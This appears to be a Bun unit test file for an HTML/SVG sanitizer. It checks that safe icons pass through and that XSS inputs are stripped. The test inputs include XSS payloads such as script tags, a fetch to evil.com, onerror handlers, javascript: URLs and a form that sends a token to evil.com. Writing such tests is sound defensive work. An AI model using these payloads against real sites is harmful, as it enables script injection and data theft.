import { describe, expect, it } from "bun:test";
import { sanitizeHtml } from "./sanitize";

describe("sanitizeHtml", () => {
  // ── Safe passthrough ─────────────────────────────────────────────────────

  it("passes through clean SVG icon", async () => {
    const svg =
      '<svg viewBox="0 0 24 24" fill="none"><path d="M5 12h14" stroke="currentColor"/></svg>';
    const result = await sanitizeHtml(svg);
    expect(result).toContain("<svg");
    expect(result).toContain('<path d="M5 12h14"');
  });

  it("passes through emoji wrapped in span", async () => {
    const result = await sanitizeHtml('<span class="icon">🎯</span>');
    expect(result).toContain("🎯");
    expect(result).toContain("<span");
  });

  it("preserves allowed SVG attributes", async () => {
    const svg =
      '<svg width="24" height="24" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="8" fill="#333"/></svg>';
    const result = await sanitizeHtml(svg);
    expect(result).toContain('aria-hidden="true"');
    expect(result).toContain('fill="#333"');
  });

  it("preserves data-* attributes", async () => {
    const result = await sanitizeHtml('<span data-id="foo" data-value="bar">x</span>');
    expect(result).toContain('data-id="foo"');
    expect(result).toContain('data-value="bar"');
  });

  // ── XSS: script injection ─────────────────────────────────────────────────

  it("removes <script> tag entirely", async () => {
    const result = await sanitizeHtml('<script>alert("xss")</script>');
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert");
  });

  it("removes <script> tag mixed with SVG", async () => {
    const input = '<svg><script>fetch("//evil.com")</script><path d="M5 12h14"/></svg>';
    const result = await sanitizeHtml(input);
    expect(result).not.toContain("<script");
    expect(result).not.toContain("fetch");
    expect(result).toContain("<path");
  });

  // ── XSS: event handlers ───────────────────────────────────────────────────

  it("removes onerror handler from img", async () => {
    const result = await sanitizeHtml('<img src="x" onerror="alert(1)">');
    expect(result).not.toContain("onerror");
    expect(result).toContain("<img");
  });

  it("removes onclick on span", async () => {
    const result = await sanitizeHtml('<span onclick="evil()">click</span>');
    expect(result).not.toContain("onclick");
    expect(result).toContain("click");
  });

  it("removes onmouseover on path", async () => {
    const result = await sanitizeHtml('<path d="M0 0" onmouseover="steal()"/>');
    expect(result).not.toContain("onmouseover");
  });

  it("removes arbitrary on* attributes", async () => {
    const result = await sanitizeHtml('<div onpointerdown="x()" onkeyup="y()">hi</div>');
    expect(result).not.toContain("onpointerdown");
    expect(result).not.toContain("onkeyup");
  });

  // ── XSS: javascript: URLs ─────────────────────────────────────────────────

  it("removes javascript: href", async () => {
    const result = await sanitizeHtml('<a href="javascript:alert(1)">click</a>');
    expect(result).not.toContain("javascript:");
  });

  it("removes javascript: src on img", async () => {
    const result = await sanitizeHtml('<img src="javascript:alert(1)">');
    expect(result).not.toContain("javascript:");
  });

  it("removes vbscript: href", async () => {
    const result = await sanitizeHtml('<a href="vbscript:msgbox(1)">x</a>');
    expect(result).not.toContain("vbscript:");
  });

  // ── XSS: disallowed tags ──────────────────────────────────────────────────

  it("removes <style> tag", async () => {
    const result = await sanitizeHtml("<style>body{display:none}</style>icon");
    expect(result).not.toContain("<style");
    expect(result).not.toContain("display:none");
  });

  it("removes <iframe>", async () => {
    const result = await sanitizeHtml('<iframe src="//evil.com"></iframe>');
    expect(result).not.toContain("<iframe");
  });

  it("removes <form> and <input>", async () => {
    const result = await sanitizeHtml(
      '<form action="//evil.com"><input name="token" value="secret"/></form>'
    );
    expect(result).not.toContain("<form");
    expect(result).not.toContain("<input");
  });

  it("unwraps unknown non-dangerous tags but keeps text content", async () => {
    // <section> is not in allowlist but not blacklisted → unwrapped
    const result = await sanitizeHtml("<section>text content</section>");
    expect(result).toContain("text content");
    expect(result).not.toContain("<section");
  });

  // ── Edge cases ────────────────────────────────────────────────────────────

  it("handles empty string", async () => {
    const result = await sanitizeHtml("");
    expect(result).toBe("");
  });

  it("handles plain text without tags", async () => {
    const result = await sanitizeHtml("hello world");
    expect(result).toBe("hello world");
  });

  it("handles complex nested SVG with gradients", async () => {
    const svg = `<svg viewBox="0 0 24 24"><defs><linearGradient id="g"><stop offset="0%" stop-color="#f00"/><stop offset="100%" stop-color="#00f"/></linearGradient></defs><circle cx="12" cy="12" r="10" fill="url(#g)"/></svg>`;
    const result = await sanitizeHtml(svg);
    expect(result).toContain("<linearGradient");
    expect(result).toContain("stop-color");
    expect(result).toContain("url(#g)");
  });
});
